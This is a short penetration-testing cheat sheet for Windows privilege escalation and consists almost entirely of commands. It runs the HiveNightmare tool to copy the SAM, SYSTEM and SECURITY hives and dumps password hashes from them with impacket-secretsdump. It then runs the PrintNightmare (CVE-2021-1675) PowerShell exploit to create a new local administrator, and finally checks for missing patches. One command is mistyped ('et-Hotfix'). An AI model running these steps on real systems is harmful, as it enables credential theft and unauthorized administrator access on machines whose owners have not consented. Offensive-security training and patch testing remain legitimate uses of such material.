# Kernel Exploits

## Checking Permissions on the SAM File
```bash
icacls c:\Windows\System32\config\SAM
```
## Attack and Parsing Password Hashes
https://github.com/GossiTheDog/HiveNightmare
```powershell
# creating copies of the aforementioned registry hives
.\HiveNightmare.exe
```
### extract the hashes with impacket
```bash
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
## Spooler Service
```powershell
ls \\localhost\pipe\spoolss
```
### Adding Local Admin
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "MyUser" -NewPassword "FakePasswd" -DriverName "ItPrint"
```
### Check New Admin User
```powershell
net user MyUser
```
## Enumerating Missing Patches
```powershell
# 3 different ways
systeminfo
wmic qfe list brief
et-Hotfix
```
### Viewing Installed Updates (KB list)
```powershell
wmic qfe list brief
```




















